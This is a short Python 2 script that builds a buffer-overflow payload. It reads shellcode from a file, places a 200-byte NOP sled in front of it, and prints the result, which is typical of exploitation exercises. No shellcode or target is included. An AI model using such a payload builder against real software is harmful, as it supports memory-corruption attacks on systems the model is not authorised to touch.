#!/usr/bin/env python

shellcode = ''

with open('shellcode.bin', 'r') as f:
    shellcode = f.readline()

buffer = '\x90' * 200 + shellcode

print buffer
